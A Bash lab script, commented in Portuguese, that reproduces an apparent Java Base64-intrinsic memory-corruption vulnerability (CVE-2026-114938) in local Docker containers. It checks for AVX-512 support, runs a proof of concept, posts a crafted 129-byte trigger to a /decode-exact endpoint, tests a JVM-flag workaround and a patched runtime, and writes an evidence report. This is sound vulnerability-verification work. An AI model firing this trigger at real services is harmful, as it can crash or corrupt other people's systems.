#!/usr/bin/env bash
# Roda o laboratorio completo em uma instancia x86-64 com AVX-512 VBMI.
# Uso:  ./deploy/run-on-instance.sh
#
# Variaveis opcionais:
#   JAVA_IMG=...        imagem base do alvo (default eclipse-temurin:17.0.6_10-jdk)
#   PATCHED_IMAGE=...   imagem corrigida para o teste de remediação
#
# Tudo escuta em 127.0.0.1. Nenhuma porta e exposta para fora da instancia.

set -uo pipefail

LAB="$(cd "$(dirname "$0")/.." && pwd)"
cd "$LAB"

# Em instancia recem-criada o usuario pode ainda nao estar no grupo docker.
# Reexecuta como root se o acesso ao socket estiver negado.
if ! docker info >/dev/null 2>&1; then
  if sudo -n docker info >/dev/null 2>&1; then
    SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
    exec sudo -n "$SELF" "$@"
  fi
  echo "docker inacessivel: rode 'newgrp docker' ou reconecte o SSH." >&2
  exit 1
fi

TS="$(date +%Y%m%d-%H%M%S)"
EVID="deploy/evidence/$TS"
mkdir -p "$EVID"

JAVA_IMG="${JAVA_IMG:-eclipse-temurin:17.0.6_10-jdk}"
PATCHED_IMAGE="${PATCHED_IMAGE:-}"
TARGET_IMG="j4s-target:lab"
PATCHED_TAG="j4s-target:patched"
NAME="j4s-target"
PORT="8080"
BASE="http://127.0.0.1:${PORT}"

say() { printf '\n== %s ==\n' "$*" | tee -a "$EVID/session.log"; }
rec() { tee -a "$EVID/session.log"; }
note() { printf '  %s\n' "$*" | tee -a "$EVID/session.log"; }

down() { docker rm -f "$NAME" >/dev/null 2>&1; }

wait_health() {
  for _ in $(seq 1 90); do
    curl -sf -m 2 "$BASE/health" >/dev/null 2>&1 && return 0
    sleep 1
  done
  return 1
}

# ---------------------------------------------------------------------------
say "1. Gate de hardware"
NEED=(avx512f avx512bw avx512vbmi bmi2)
FLAGS="$(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n')"
MISSING=()
for f in "${NEED[@]}"; do grep -qx "$f" <<<"$FLAGS" || MISSING+=("$f"); done
lscpu > "$EVID/lscpu.txt" 2>&1

if [ ${#MISSING[@]} -ne 0 ]; then
  note "CPU sem: ${MISSING[*]}"
  note "ABORTANDO: esta instancia nao executa o codigo vulneravel."
  {
    echo "# Relatorio CVE-2026-114938"
    echo
    echo "Status: **INCONCLUSIVO** — instancia sem AVX-512 VBMI."
    echo
    echo "Flags ausentes: ${MISSING[*]}"
    echo
    echo '```'; head -20 "$EVID/lscpu.txt"; echo '```'
  } > "$EVID/report.md"
  exit 2
fi
note "OK: todos os flags presentes ($(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs))"

# ---------------------------------------------------------------------------
say "2. Ambiente"
docker version --format 'docker {{.Server.Version}}' | rec
"$LAB/deploy/_in_jdk.sh" "$JAVA_IMG" 'java -version 2>&1; java -XX:+PrintFlagsFinal -version 2>/dev/null | grep -E "UseAVX|UseBASE64Intrinsics"' \
  2>&1 | tee "$EVID/jdk.txt"

# ---------------------------------------------------------------------------
say "3. Build do alvo"
docker build -q -t "$TARGET_IMG" ./target >/dev/null 2>&1
if [ $? -ne 0 ]; then note "build falhou"; exit 1; fi
note "imagem $TARGET_IMG pronta"

# ---------------------------------------------------------------------------
say "4. PoC bounded (seguro) no runtime vulneravel"
down
docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JAVA_IMG" \
  sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
  2>&1 | tee "$EVID/poc-vulneravel.txt"
if grep -q '^REPRODUCED' "$EVID/poc-vulneravel.txt"; then
  note "corrupcao REPRODUZIDA (62 bytes alem do array)"
  BOUNDED="REPRODUCED"
else
  note "nao reproduziu neste runtime"
  BOUNDED="NOT REPRODUCED"
fi

# ---------------------------------------------------------------------------
say "5. Trigger no caminho realistico (/decode, alocacao interna)"
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
  -e JAVA_OPTS="-XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
if wait_health; then note "alvo no ar: $(curl -s "$BASE/health")"; else note "alvo nao subiu"; fi

VALID="$(python3 -c 'print("A"*64)')"
TRIG="$(python3 -c 'import sys;sys.stdout.write("A"*128+"=")')"   # 129 bytes

note "baseline valido -> $(curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe")"
: > "$EVID/trigger.log"
# um unico disparo: a primeira excecao desotimiza decode0
r="$(curl -s -m 30 -w '|http=%{http_code}' -X POST --data-binary "$TRIG" "$BASE/decode-exact")"
echo "len=${#TRIG} -> $r" >> "$EVID/trigger.log"
cat "$EVID/trigger.log" | tee -a "$EVID/session.log"

STATE="$(docker inspect -f '{{.State.Status}} restarts={{.RestartCount}}' "$NAME" 2>/dev/null)"
note "estado do container: $STATE"
docker logs "$NAME" > "$EVID/container.log" 2>&1
mkdir -p "$EVID/app"
docker cp "$NAME:/app/." "$EVID/app/" >/dev/null 2>&1
ls "$EVID/app" | grep -q 'hs_err' && note "hs_err capturado em $EVID/app"

# ---------------------------------------------------------------------------
say "6. Workaround -XX:-UseBASE64Intrinsics"
down
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
  -e JAVA_OPTS="-XX:-UseBASE64Intrinsics -XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
wait_health && note "alvo no ar: $(curl -s "$BASE/health")"
curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe" > "$EVID/workaround.txt"
echo " gatilho129 -> $(curl -s -m 30 -X POST --data-binary "$TRIG" "$BASE/decode-exact")" >> "$EVID/workaround.txt"
cat "$EVID/workaround.txt" | tee -a "$EVID/session.log"
note "container: $(docker inspect -f '{{.State.Status}}' "$NAME")"

# ---------------------------------------------------------------------------
if [ -n "$PATCHED_IMAGE" ]; then
  say "7. Remediacao: runtime corrigido ($PATCHED_IMAGE)"
  docker build -q --build-arg BASE_IMAGE="$PATCHED_IMAGE" -t "$PATCHED_TAG" ./target >/dev/null 2>&1
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$PATCHED_IMAGE" \
    sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
    2>&1 | tee "$EVID/poc-corrigido.txt"
  grep -q '^REPRODUCED' "$EVID/poc-corrigido.txt" && PATCHED="AINDA VULNERAVEL" || PATCHED="corrigido"
  note "resultado: $PATCHED"
else
  PATCHED="nao testado (PATCHED_IMAGE nao definida)"
fi

# ---------------------------------------------------------------------------
say "8. Relatorio"
down
{
  echo "# Relatorio CVE-2026-114938 (Java4Shell)"
  echo
  echo "- Data: $(date -Is)"
  echo "- Host: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs)"
  echo "- Runtime alvo: \`$JAVA_IMG\`"
  echo "- Flags AVX-512: presentes"
  echo
  echo "## Resultado"
  echo
  echo "| Teste | Resultado |"
  echo "|---|---|"
  echo "| PoC bounded (vulneravel) | $BOUNDED |"
  echo "| Container apos trigger | $STATE |"
  echo "| Workaround \`-XX:-UseBASE64Intrinsics\` | $(tail -2 "$EVID/workaround.txt" | tr '\n' ' ') |"
  echo "| Remediacao | $PATCHED |"
  echo
  echo "## Evidencias"
  echo
  echo '```'
  echo "--- poc-vulneravel.txt"; cat "$EVID/poc-vulneravel.txt"
  echo "--- trigger.log"; cat "$EVID/trigger.log"
  echo "--- jdk.txt"; cat "$EVID/jdk.txt"
  echo '```'
  echo
  if [ -d "$EVID/app" ] && ls "$EVID/app" | grep -q 'hs_err'; then
    echo "## hs_err"
    echo
    echo '```'; head -40 "$EVID"/app/hs_err_*.log; echo '```'
  fi
} > "$EVID/report.md"

note "relatorio: $EVID/report.md"
note "arquivos: $(ls "$EVID" | tr '\n' ' ')"
